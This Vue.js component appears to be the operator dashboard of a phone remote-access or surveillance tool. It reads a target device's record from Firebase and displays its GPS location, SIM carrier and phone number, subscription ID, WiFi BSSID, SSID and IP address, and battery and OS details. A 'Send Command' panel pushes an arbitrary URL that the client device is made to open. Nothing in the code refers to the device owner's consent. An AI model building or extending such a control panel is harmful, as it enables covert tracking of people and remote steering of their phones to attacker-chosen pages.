<style>
input {
    border: 1px solid white;
    margin: 2%;
}
button {
    border: 1px solid white;
}
</style>

<template>
    <div class="flex flex-col items-center bg-gray-900 p-4 gap-6 min-h-screen">
        <div class="w-full max-w-sm sm:max-w-md md:max-w-lg lg:max-w-xl bg-gray-800 text-white rounded-2xl shadow-lg p-6">
            <h2 class="text-xl font-bold text-green-400 mb-4">Device Information:</h2>
            <div v-if="!devices">
                <p class="text-red-500">No data</p>
            </div>
            <div v-else>
                <p class="text-xl">Battery Info:</p>
                <p>- Battery Level: {{ (devices.deviceBattery?.batteryLevel * 100).toFixed(0) }}%</p>
                <p>- Charging: {{ devices.deviceBattery.isCharging ? 'Yes' : 'No' }}</p>

                <p class="text-xl mt-3">Device Info:</p>
                <p>- Operating System: {{ devices.deviceInfo.operatingSystem }}</p>
                <p>- OS Versioin: {{ devices.deviceInfo.osVersion }}</p>
                <p>- Model: {{ devices.deviceInfo.model }}</p>
                <p>- Manufacturer: {{ devices.deviceInfo.manufacturer }}</p>
                <p>- Platform: {{ devices.deviceInfo.platform }}</p>
                <p>- Webview Version: {{ devices.deviceInfo.webViewVersion }}</p>
                <p>- Virtual: {{ devices.deviceInfo.isVirtual ? 'Yes' : 'No' }}</p>

                <p class="text-xl mt-3">Geolocation: </p>
                <div v-if="devices?.coordinates?.coords">
                    <p>- Accuracy: {{ devices.coordinates.coords.accuracy }}</p>
                    <p>- Altitude: {{ devices.coordinates.coords.altitude }}</p>
                    <p>- Heading: {{ devices.coordinates.coords.heading }}</p>
                    <p>- Latitude: {{ devices.coordinates.coords.latitude }}</p>
                    <p>- Longitude: {{ devices.coordinates.coords.longitude }}</p>
                </div>
                <p v-else class="text-gray-400">
                    {{ devices.coordinates || "No location data" }}
                </p>

                <p class="text-xl mt-3">Sim Card Info: </p>
                <div v-if="devices?.Sim_card?.simCards?.length">
                    <div v-for="(sim, index) in devices.Sim_card.simCards" :key="index" class="mb-2">
                        <p>SIM {{ index + 1 }}:</p>
                        <p>- Carrier Name: {{ sim.carrierName || 'N/A' }}</p>
                        <p>- Iso Country Code: {{ sim.isoCountryCode || 'N/A' }}</p>
                        <p>- Mobile Country Code: {{ sim.mobileCountryCode || 'N/A' }}</p>
                        <p>- Mobile Network Code: {{ sim.mobileNetworkCode || 'N/A' }}</p>
                        <p>- Number: {{ sim.number || 'N/A' }}</p>
                        <p>- Subscription Id: {{ sim.subscriptionId || 'N/A' }}</p>
                    </div>
                </div>
                <p v-else class="text-gray-400">No SIM data available</p> 
                
                <p class="text-xl mt-3">Network Status:</p>
                <div v-if="devices?.network_status">                   
                    <p>- Connected: {{ devices.network_status.connected ? 'Yes' : 'No' }}</p>
                    <p>- Connection Type: {{ devices.network_status.connectionType.toUpperCase() || 'Unknown' }}</p>
                </div>
                <p v-else class="text-gray-400">No Network Data</p>

                <p class="text-xl mt-3">WiFi Information</p>
                <div v-if="typeof devices?.wifi_info === 'object'">
                    <p>- BSSID: {{ devices.wifi_info.bssid }}</p>
                    <p>- SSID: {{ devices.wifi_info.ssid }}</p>
                    <p>- IP: {{ devices.wifi_info.ip }}</p>
                    <p>- Signal Strength: {{ devices.wifi_info.signalStrength }}</p>
                    <p>- Speed: {{ devices.wifi_info.linkSpeed }}</p>
                    <p>- Frequency: {{ devices.wifi_info.frequency}}</p>
                </div>

                <p v-else class="text-gray-400">
                    {{ devices?.wifi_info || "User Not Connected To WiFi" }}
                </p>
            </div>
        </div>

        <div class="w-full max-w-sm sm:max-w-md md:max-w-lg lg:max-w-xl bg-gray-800 text-white rounded-2xl shadow-lg p-6">
            <h2 class="text-xl font-bold text-green-400 mb-4">Send Command: </h2>
            <div v-if="!devices">
                <p class="text-red-500">Can't push data to clicnt device</p>
            </div>
            <div v-else>
                <p class="text-xl mt-3">Send Website</p>
                <div>
                    <input type="text" v-model="openBrowser" placeholder="Enter website">
                    <button @click="OpenBrowswer">Send to client</button>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref, onMounted } from "vue";
import { useRoute } from 'vue-router';
import { db } from "../../../assets/db/firebase";
import { ref as dbRef, onValue } from "firebase/database";
import { update } from "firebase/database";

const devices = ref(null);

const router = useRoute()
const id = router.params.id;

const view_data = async () => {
    const deviceRef = dbRef(db, `Device/${id}`);
    
    onValue(deviceRef, (snapshot) => {
        devices.value = snapshot.val();
        console.log("DATA:", devices.value);
        console.log("RAW:", snapshot.val());
    });
}

const openBrowser = ref('');
const OpenBrowswer = async () => {
    if (!openBrowser.value) {
        alert('Enter Website Please')
        return;
    }
    if (!openBrowser.value.startsWith('http://') && !openBrowser.value.startsWith('https://')) {
        alert('Inclued http:// or https://')
        return;
    }
    const deviceRef = dbRef(db, `Device/${id}`);
    await update(deviceRef, {
        open_browser: openBrowser.value
    });
    alert('sent!!')
}

const taost = ref();
onMounted(() => {
    view_data();
});

</script>